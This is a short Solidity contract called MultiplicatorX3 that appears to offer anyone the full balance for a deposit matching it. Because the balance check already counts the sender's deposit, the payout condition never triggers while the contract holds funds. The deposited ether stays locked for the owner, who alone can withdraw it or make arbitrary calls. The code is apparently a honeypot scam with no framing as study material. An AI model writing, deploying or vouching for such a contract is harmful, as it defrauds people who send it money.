pragma solidity ^0.4.18;

contract MultiplicatorX3 {
    address public owner = msg.sender;

    function() public payable {}

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address _adr, bytes _data) public payable {
        require(msg.sender == owner);
        require(_adr != address(0));
        require(_data.length > 0);
        bool success = _adr.call.value(msg.value)(_data);
        require(success);
    }

    function multiplicator(address _adr) public payable {
        require(_adr != address(0));
        require(msg.value > 0);
        if (msg.value >= this.balance) {
            _adr.transfer(this.balance);
        }
    }
}